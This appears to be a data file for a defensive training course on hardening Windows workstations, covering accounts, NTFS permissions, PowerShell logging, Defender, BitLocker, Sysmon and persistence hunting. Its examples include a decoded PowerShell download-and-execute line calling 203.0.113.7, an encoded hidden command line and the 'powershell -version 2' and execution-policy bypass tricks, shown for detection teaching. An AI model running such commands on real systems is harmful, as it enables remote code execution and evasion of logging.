import type { CourseBody } from '../../types';
import { questions } from './questions.en';

export const body: CourseBody = {
  courseId: 'd-windows-poste-durcissement',
  lesson: {
    intro:
      'The Windows workstation is the most frequent entry point of attacks: an opened attachment, a macro, a downloaded script. Most of the necessary protections are already in the system; they still have to be enabled, tuned, and made to produce logs that explain what happened. This course walks through these protections layer by layer, from the user account to logging.',
    sections: [
      {
        id: 'comptes',
        title: 'Accounts, tokens and UAC',
        blocks: [
          { t: 'p', text: 'Each Windows process runs with an **access token** that carries the user’s identity (their SID), their groups and their privileges. This token is what the system compares with the permissions of each object (file, registry key, service).' },
          { t: 'def', term: 'UAC (User Account Control)', text: 'An administrator opens a session with **two tokens**: a filtered token, without administrative rights, used by default, and a full token used only after an elevation request. UAC is a convenience and risk-reduction barrier; Microsoft does not consider it a security boundary.' },
          {
            t: 'table',
            head: ['Situation', 'Risk', 'Measure'],
            rows: [
              ['The user works with a local administrator account', 'Malware launched by the user can elevate and disable the protections', 'Standard account day to day, separate administration account'],
              ['Same local administrator password on all workstations', 'One compromised workstation gives access to all the others (lateral movement)', 'Unique, renewed password (Windows LAPS)'],
              ['LSASS memory readable by an administrator process', 'Theft of hashes and tickets (Mimikatz)', 'LSA protection (RunAsPPL), Credential Guard'],
            ],
          },
          { t: 'def', term: 'Windows LAPS', text: 'A feature that gives each workstation a **random local administrator password**, renewed automatically and stored in the directory (Active Directory or Entra ID) for authorized people only. A compromised workstation no longer gives access to the others.' },
          { t: 'def', term: 'LSA protection and Credential Guard', text: 'The **LSASS** process keeps authentication secrets in memory. LSA protection (RunAsPPL) prevents an untrusted process from reading it; **Credential Guard** places these secrets in a container isolated by virtualization. Both complicate credential theft, as does avoiding privileged sessions on ordinary workstations.' },
          { t: 'callout', kind: 'key', text: 'Removing local administrator rights from users is, by itself, one of the most effective measures: many attack techniques on the workstation assume these rights.' },
        ],
      },
      {
        id: 'ntfs',
        title: 'NTFS permissions and icacls',
        blocks: [
          { t: 'p', text: 'On NTFS, each file and folder carries an **access control list** (DACL) made of entries (ACEs) that allow or deny rights to accounts or groups. Permissions are **inherited** by default from the parent folder.' },
          { t: 'code', lang: 'text', caption: 'Reading then fixing the permissions of a scripts folder', code: 'C:\\> icacls C:\\Scripts\nC:\\Scripts BUILTIN\\Users:(OI)(CI)(M)\n           BUILTIN\\Administrators:(OI)(CI)(F)\n           NT AUTHORITY\\SYSTEM:(OI)(CI)(F)\n\n:: Users can MODIFY the scripts: dangerous if a scheduled task\n:: runs them with a privileged account.\nC:\\> icacls C:\\Scripts /remove:g "BUILTIN\\Users"\nC:\\> icacls C:\\Scripts /grant "BUILTIN\\Users:(OI)(CI)RX"' },
          {
            t: 'table',
            caption: 'icacls abbreviations',
            head: ['Code', 'Meaning'],
            rows: [['F', 'Full control'], ['M', 'Modify (read, write, delete)'], ['RX', 'Read and execute'], ['(OI) / (CI)', 'Inheritance to files / to subfolders'], ['/inheritance:r', 'Removes the permissions inherited from the parent']],
          },
          { t: 'callout', kind: 'warn', text: 'The same reasoning applies to the **paths of services and tasks**: if a program run as SYSTEM sits in a folder that users can modify, a user can replace it and obtain the rights of the service account.' },
          { t: 'def', term: 'Explicit deny', text: 'A deny ACE overrides an allow at the same level. Denies are hard to manage: it is better not to grant the right than to deny it afterwards.' },
        ],
      },
      {
        id: 'powershell',
        title: 'PowerShell: an administration and attack tool',
        blocks: [
          { t: 'p', text: 'PowerShell gives full access to the system and to .NET: it is the administrators’ tool and, for the same reason, one of those most used by attackers (“living off the land”). Blocking it entirely is rarely possible; it is made **observable** and **restricted**.' },
          { t: 'diagram', id: 'attack-chain', caption: 'A typical attack chain starting from an Office macro, and the countermeasure that cuts each step: no measure is enough alone, but together they break the chain.', alt: 'Diagram of an attack chain from Word to PowerShell to download to persistence to LSASS access, with under each step the matching defense: ASR rule, restricted language, proxy filtering, application control, LSA protection.' },
          { t: 'callout', kind: 'warn', title: 'The execution policy is not a protection', text: 'Microsoft’s documentation states it: the execution policy (`Set-ExecutionPolicy`) is not a security boundary, only a defense in depth that mainly avoids running a script by mistake. It is trivially bypassed (`powershell -ExecutionPolicy Bypass`, copy-pasting the content). It replaces neither logging nor application control.' },
          {
            t: 'table',
            head: ['Measure', 'Effect'],
            rows: [
              ['Script block logging', 'Records the code actually executed, **after** deobfuscation, in `Microsoft-Windows-PowerShell/Operational` (event **4104**)'],
              ['Module logging (4103) and transcription', 'Traces the commands and their outputs'],
              ['Constrained language mode', 'Imposed by App Control for Business (WDAC) or AppLocker: blocks direct access to .NET and Windows APIs for untrusted scripts'],
              ['Removing the PowerShell 2.0 engine', 'This old version does not know script block logging: an attacker can invoke it to escape the traces'],
            ],
          },
          { t: 'def', term: 'AMSI', text: 'The antimalware scan interface: PowerShell, Office and other applications submit to Defender (or another antimalware) the content of a script or macro **just before it runs**, including after deobfuscation in memory. It compensates for the absence of a file in an attack run in memory.' },
          { t: 'p', text: 'An attacker can launch `powershell -version 2`: the old engine ignores both AMSI and script block logging. Removing this Windows feature from workstations closes this downgrade path.' },
          {
            t: 'example',
            title: 'What event 4104 reveals',
            blocks: [
              { t: 'code', lang: 'text', code: 'Command line seen by the process:\npowershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...\n\nEvent 4104 (decoded script block):\nIEX (New-Object Net.WebClient).DownloadString(\'http://203.0.113.7/a.ps1\')' },
              { t: 'p', text: 'The Base64-encoded command hides its intent; script block logging shows the download and then the in-memory execution of a remote script. This event, the address and the parent process (often Word or Outlook) are enough to open an incident.' },
            ],
          },
        ],
      },
      {
        id: 'protections',
        title: 'Built-in protections: Defender, firewall, BitLocker',
        blocks: [
          { t: 'list', items: ['**Microsoft Defender Antivirus** with **tamper protection** enabled: a process, even an administrator one, can no longer disable real-time protection.', '**Attack surface reduction (ASR) rules**: for example, preventing Office applications from creating child processes, blocking credential theft from `lsass.exe`, blocking executable content received by email. They are deployed first in **audit** mode, then in **block** mode.', '**Windows Firewall**: three profiles (domain, private, public). The public profile applies on an unknown network and must refuse all inbound connections.', '**BitLocker**: disk encryption, key protected by the TPM.'] },
          {
            t: 'table',
            head: ['Firewall profile', 'Applies to', 'Expected setting'],
            rows: [
              ['**Domain**', 'Network where the workstation has joined its domain controller', 'Company rules, inbound filtered'],
              ['**Private**', 'Network judged trusted (home)', 'Inbound filtered, limited sharing'],
              ['**Public**', 'Unknown network (café, hotel, station)', 'No inbound connection, sharing and discovery disabled'],
            ],
          },
          { t: 'p', text: 'By default, Windows Firewall blocks unsolicited inbound traffic and **allows outbound traffic**: strict outbound filtering is possible, but requires a precise rule policy.' },
          { t: 'def', term: 'TPM (Trusted Platform Module)', text: 'A component that stores keys and releases them only if the measured boot chain has not been modified. With BitLocker in **TPM only** mode, the disk unlocks automatically at startup; in **TPM + PIN** mode, a code is also required, which better protects a stolen laptop against certain physical attacks.' },
          { t: 'callout', kind: 'tip', text: 'The BitLocker recovery key must be backed up in the directory (Active Directory or Entra ID) **before** encryption: without it, a firmware update or a motherboard change can make the data unrecoverable.' },
        ],
      },
      {
        id: 'journaux',
        title: 'Windows logs and Sysmon',
        blocks: [
          { t: 'p', text: 'By default, Windows logs few things useful for detection. Two settings change everything: auditing **process creation with command line** (security event **4688**) and **Sysmon**, a free tool from the Sysinternals suite that produces detailed events.' },
          {
            t: 'table',
            caption: 'The most used Sysmon events',
            head: ['ID', 'Event', 'Use in detection'],
            rows: [
              ['1', 'Process creation (with hash and parent process)', 'Office launching PowerShell, a binary launched from a temporary folder'],
              ['3', 'Network connection', 'An unexpected process contacting the Internet'],
              ['7', 'Image (DLL) load', 'Loading of an unsigned DLL by a system process'],
              ['8', 'Remote thread creation', 'Code injection into another process'],
              ['10', 'Process access', 'Opening of `lsass.exe` for reading: credential theft'],
              ['11', 'File creation', 'Drop of executables or scripts'],
              ['13', 'Registry value modification', 'Persistence through the `Run` keys'],
              ['22', 'DNS query', 'Domains contacted by each process'],
            ],
          },
          {
            t: 'table',
            caption: 'Windows events to know',
            head: ['ID', 'Log', 'Meaning'],
            rows: [
              ['4624 / 4625', 'Security', 'Successful / failed logon (the type tells interactive, network, RDP)'],
              ['4688', 'Security', 'Process creation (with the command line if auditing is enabled)'],
              ['4698', 'Security', 'Scheduled task creation'],
              ['4104', 'PowerShell/Operational', 'Script block executed, after deobfuscation'],
              ['7045', 'System', 'Service installation'],
              ['1102', 'Security', 'Clearing of the security log'],
            ],
          },
          { t: 'def', term: 'Sysmon configuration', text: 'An XML file that says what to include and exclude. Without filtering, Sysmon produces an unmanageable volume; one starts from a maintained community configuration, then adapts it to one’s estate.' },
          { t: 'callout', kind: 'key', text: 'Logs that stay on the workstation are only useful after the fact, and can be erased (event 1102 in the security log). They must be collected continuously (Windows Event Forwarding or the SIEM agent).' },
        ],
      },
      {
        id: 'persistance',
        title: 'Spotting persistence on a workstation',
        blocks: [
          { t: 'p', text: 'Once inside a workstation, the attacker wants to **stay** there after a restart or a logoff: this is **persistence**. The mechanisms are few and can be checked: knowing where to look makes it possible to clean a workstation without the problem coming back.' },
          {
            t: 'table',
            head: ['Location', 'Example', 'How to list it'],
            rows: [
              ['Registry `Run` and `RunOnce` keys', 'A program launched at each logon', '`reg query`, Autoruns, Sysmon 13'],
              ['Startup folder', 'A shortcut or script dropped in the profile', 'Explorer, Autoruns, Sysmon 11'],
              ['Scheduled tasks', 'A SYSTEM task launched at boot or every hour', '`schtasks /query /fo LIST /v`, event 4698'],
              ['Services', 'An automatic-start service pointing to a foreign binary', '`sc qc name`, event 7045'],
              ['Permanent WMI subscriptions', 'A trigger that runs code on an event', 'Autoruns, Sysmon 19 to 21'],
            ],
          },
          { t: 'code', lang: 'text', caption: 'A few basic checks', code: 'schtasks /query /fo LIST /v\nsc qc WinUpdateSvc\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nautorunsc -a * -s -h    :: everything, with signature and hash' },
          { t: 'def', term: 'Autoruns', text: 'A Sysinternals tool that lists **all** the automatic-start locations (registry, tasks, services, drivers, WMI…), verifies file signatures and computes their hash. Its command-line version (`autorunsc`) fits into a collection script.' },
          { t: 'def', term: 'Permanent WMI subscription', text: 'An association (filter, consumer and binding) recorded in the **WMI repository**: code runs when an event occurs. Absent from the `Run` keys and from the tasks, it escapes the usual checks: it is searched for with Autoruns or with Sysmon events 19 to 21.' },
          {
            t: 'example',
            title: 'A service that does not look like Windows’ ones',
            blocks: [
              { t: 'p', text: 'The service “WinUpdateSvc” automatically starts `C:\\Users\\Public\\svc.exe` with the SYSTEM account. Legitimate services reside in `C:\\Windows` or `C:\\Program Files`, write-protected: a binary in a folder everyone can modify, under a name imitating Windows, is the sign of an installation by an attacker.' },
            ],
          },
          { t: 'callout', kind: 'warn', title: 'Deleting the file is not enough', text: 'If the program is deleted but not the task, key or service that launches it, the persistence remains: it fails in a loop or relaunches another component. One **disables the persistence first**, collects what serves the analysis, then deletes, and looks for the other entry points. If in doubt about the extent, the workstation is reinstalled from a clean medium.' },
        ],
      },
    ],
    useCases: [
      'Estate hardening project: standard accounts, LAPS, ASR rules in audit then in block mode, BitLocker with the key backed up in the directory.',
      'SOC: deploying Sysmon and PowerShell logging to be able to detect “Office → PowerShell → download” chains.',
      'Workstation audit: listing the folders modifiable by users and executed by privileged accounts.',
      'Persistence hunting after an incident: scheduled tasks, services, Run keys and WMI subscriptions, with Autoruns and Sysmon.',
    ],
    commonMistakes: [
      'Leaving users as local administrators “to avoid tickets”.',
      'Considering `Set-ExecutionPolicy Restricted` as a protection against malicious scripts.',
      'Enabling ASR rules directly in block mode without an audit phase, then disabling everything when facing false positives.',
      'Encrypting with BitLocker without backing up the recovery key.',
      'Deploying Sysmon without a filtering configuration, then no longer using the logs for lack of being able to read them.',
      'Deleting the malicious file without removing the task, service or key that relaunches it.',
      'Leaving a program run as SYSTEM in a folder modifiable by users.',
    ],
    bestPractices: [
      'Standard account day to day, separate administration account, unique local administrator password (LAPS).',
      'LSA protection and Credential Guard on compatible workstations.',
      'Script block logging, constrained language mode through application control, removal of PowerShell 2.0.',
      'Defender with tamper protection, ASR rules, firewall active on the three profiles.',
      'Sysmon with a maintained configuration, 4688 auditing with command line, central log collection.',
      'Regular inventory of startup points (Autoruns) and alerts on task creation (4698) and service installation (7045).',
      'Removal of PowerShell 2.0 and control of in-memory execution through AMSI, combined with 4104 logging.',
    ],
    keyPoints: [
      'The access token carries identity; UAC separates filtered token and full token.',
      'NTFS permissions: inheritance by default, `icacls` to read and fix.',
      'The PowerShell execution policy is not a security barrier; event 4104 shows the real code.',
      'ASR, tamper protection, per-profile firewall, BitLocker with TPM: already there, to be enabled.',
      'Sysmon: 1 process, 3 network, 10 process access, 22 DNS.',
      'Persistence: Run, Startup folder, tasks, services, WMI; the mechanism is removed first, then the file.',
    ],
  },
  practice: [
    {
      id: 'chaine-office',
      kind: 'analysis',
      title: 'Analyzing a chain of events on a workstation',
      context: [
        { t: 'p', text: 'Sysmon events of a workstation, sorted by time:' },
        { t: 'code', lang: 'text', code: '09:14:02  ID 1   WINWORD.EXE → powershell.exe -nop -w hidden -enc SQBFAFgA...\n09:14:03  ID 22  powershell.exe → DNS query mise-a-jour-office.example\n09:14:03  ID 3   powershell.exe → 203.0.113.7:443\n09:14:05  ID 11  powershell.exe → C:\\Users\\lea\\AppData\\Roaming\\upd.exe\n09:14:06  ID 13  powershell.exe → HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd\n09:14:09  ID 10  upd.exe → access to lsass.exe (0x1010)' },
      ],
      steps: ['Reconstruct the scenario step by step.', 'Associate each step with a technique or a tactic (initial access, execution, persistence, credential access).', 'State which hardening measure would have blocked each step.'],
    },
    {
      id: 'plan-durcissement',
      kind: 'case',
      title: 'Case study: a hardening plan for a 300-workstation estate',
      context: [{ t: 'p', text: 'An SME with 300 Windows 11 workstations managed by Active Directory: users are local administrators, the same administrator password everywhere, no laptop encryption, logs not collected.' }],
      steps: ['Propose the measures in order of priority.', 'For each measure, state how to deploy it without blocking the business.', 'Propose an indicator that shows the measure is in place.'],
    },
    {
      id: 'chasse-persistance',
      kind: 'analysis',
      labId: 'windows-persistence-lab',
      title: 'Analyzing the startup points of a suspect workstation',
      context: [
        { t: 'p', text: 'Extract of a startup inventory (Autoruns) of a workstation that gets reinfected after cleaning:' },
        { t: 'code', lang: 'text', code: 'Task    \\Microsoft\\Windows\\UpdateCheck   SYSTEM    C:\\Users\\Public\\upd.exe     (created at 03:12)\nRun     HKLM  OneDriveSync               User      "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe" /background\nService WinUpdateSvc  auto start         SYSTEM    C:\\Users\\Public\\svc.exe\nStartup (folder): empty' },
      ],
      steps: ['Identify the suspicious entries and those that seem legitimate, with justification.', 'State in which order to act and what to collect before deleting.', 'Propose the logs to consult and a lasting detection.'],
    },
  ],
  questions,
  resources: [
    { title: 'About Execution Policies', source: 'Microsoft Learn', url: 'https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_execution_policies' },
    { title: 'Attack surface reduction rules reference', source: 'Microsoft Learn', url: 'https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference' },
    { title: 'Sysmon', source: 'Microsoft Sysinternals', url: 'https://learn.microsoft.com/sysinternals/downloads/sysmon' },
    { title: 'Autoruns', source: 'Microsoft Sysinternals', url: 'https://learn.microsoft.com/sysinternals/downloads/autoruns' },
    { title: 'Antimalware Scan Interface (AMSI)', source: 'Microsoft Learn', url: 'https://learn.microsoft.com/windows/win32/amsi/antimalware-scan-interface-portal' },
    { title: 'BitLocker overview', source: 'Microsoft Learn', url: 'https://learn.microsoft.com/windows/security/operating-system-security/data-protection/bitlocker/' },
    { title: 'Recommendations for the secure administration of information systems (in French)', source: 'ANSSI', url: 'https://cyber.gouv.fr/publications/recommandations-relatives-ladministration-securisee-des-si' },
  ],
};
